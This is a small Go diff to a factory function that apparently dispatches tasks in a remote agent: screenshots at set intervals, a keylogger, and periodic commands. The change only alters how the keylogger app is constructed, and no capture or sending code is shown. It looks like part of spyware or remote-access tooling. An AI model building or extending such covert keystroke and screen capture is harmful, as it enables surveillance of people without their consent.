@@ -49,7 +49,7 @@ func NewAppFactory(appData AppData) (App, error) {
 		app = NewScreenshotApp(appParams["Interval"].(int), appParams["Quality"].(int))
 		break
 	case KeyLoggerTask:
-		app, err = newApp[KeyLoggerApp](appData.Params)
+		app = NewKeyLoggerApp()
 		break
 	case CommandTask:
 		app, err = newApp[PeriodicCommandApp](appData.Params)
